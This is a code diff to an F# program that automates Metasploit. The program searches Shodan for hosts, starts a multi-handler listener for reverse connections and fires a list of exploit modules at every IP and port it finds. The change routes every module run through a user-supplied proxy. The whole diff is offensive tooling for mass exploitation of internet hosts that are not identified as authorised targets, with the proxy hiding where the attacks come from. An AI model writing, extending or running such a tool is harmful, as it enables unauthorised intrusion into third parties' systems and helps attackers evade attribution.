@@ -67,7 +67,7 @@ module Program =
         printf "%s" prompt
         Console.ReadLine()
 
-    // Function to set a proxy in Metasploit if required
+    // Function to configure the proxy (if required) and return the setg command string
     let configureProxy logFilePath =
         let useProxy = getUserInput "Do you want to use a proxy? (Y/N): "
         if useProxy.ToUpper() = "Y" then
@@ -75,8 +75,10 @@ module Program =
             let proxyHostPort = getUserInput "Enter the proxy host and port in format host:port: "
             let proxyCommand = sprintf "setg proxies %s:%s" proxyType proxyHostPort
             runMetasploitCommand proxyCommand logFilePath false
+            Some (sprintf "setg proxies %s:%s" proxyType proxyHostPort) // Return the proxy command to use it later
         else
             printfn "No proxy configured."
+            None // No proxy to set later
 
     // Start multi-handler listener
     let startMultiHandler lhost lport logFilePath =
@@ -134,11 +136,15 @@ module Program =
         File.ReadAllLines(modulesPath)
 
     // Run the modules
-    let runModules (modules: string[]) (ipsAndPorts: (string * string)[]) lhost lport logFilePath =
+    let runModules (modules: string[]) (ipsAndPorts: (string * string)[]) lhost lport logFilePath proxyCommand =
         for (ip, port) in ipsAndPorts do
             printfn "Running modules on %s:%s" ip port
             for moduleName in modules do
-                let command = sprintf "use %s; set RHOST %s; set RPORT %s; set LHOST %s; set LPORT %s; run; exit" moduleName ip port lhost lport
+                // Add proxy command before each module execution if a proxy is set
+                let command =
+                    match proxyCommand with
+                    | Some proxyCmd -> sprintf "%s; use %s; set RHOST %s; set RPORT %s; set LHOST %s; set LPORT %s; run; exit" proxyCmd moduleName ip port lhost lport
+                    | None -> sprintf "use %s; set RHOST %s; set RPORT %s; set LHOST %s; set LPORT %s; run; exit" moduleName ip port lhost lport
                 runMetasploitCommand command logFilePath false
 
     // Main function
@@ -157,7 +163,7 @@ module Program =
         File.WriteAllText(logFilePath, "")
 
         // Step 1: Configure proxy if needed
-        configureProxy logFilePath
+        let proxyCommand = configureProxy logFilePath
 
         // Step 2: Run Shodan search and create results file
         printfn "Running Shodan search..."
@@ -173,8 +179,8 @@ module Program =
         printfn "Starting multi-handler with LHOST = %s and LPORT = %s..." lhost lport
         startMultiHandler lhost lport logFilePath
 
-        // Step 6: Run modules on IPs and ports
-        runModules modules ipsAndPorts lhost lport logFilePath
+        // Step 6: Run modules on IPs and ports, with proxy if set
+        runModules modules ipsAndPorts lhost lport logFilePath proxyCommand
 
         // Exit successfully
         0
